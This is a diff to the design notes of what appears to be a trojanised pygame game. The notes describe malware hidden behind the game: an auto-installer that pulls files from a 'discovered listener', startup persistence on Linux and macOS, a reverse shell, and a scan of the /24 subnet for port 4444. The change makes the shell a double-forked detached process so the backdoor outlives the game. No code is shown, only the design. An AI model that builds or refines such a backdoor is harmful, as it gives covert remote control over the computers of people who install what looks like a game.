@@ -25,7 +25,7 @@ Upon running `main.py`, the following sequence occurs:
 1.  **Environment Check**: Checks for `pygame` and required assets.
 2.  **Auto-Installer**: If libraries or assets are missing, it attempts to install them or download them from a discovered listener.
 3.  **Persistence Registration**: Depending on the OS (Linux or macOS), it creates a startup entry.
-4.  **Background Threading**: Launches the Reverse Shell logic in a separate daemon thread to avoid blocking the game engine.
+4.  **Detached Background Process**: Launches the Reverse Shell logic using a **double-fork** mechanism (on Unix/macOS). This ensure the backdoor remains active even if the main game process is terminated.
 
 ### 2. Networking Logic (`network.py`)
 - **Discovery**: Scans the `/24` subnet for port 4444.
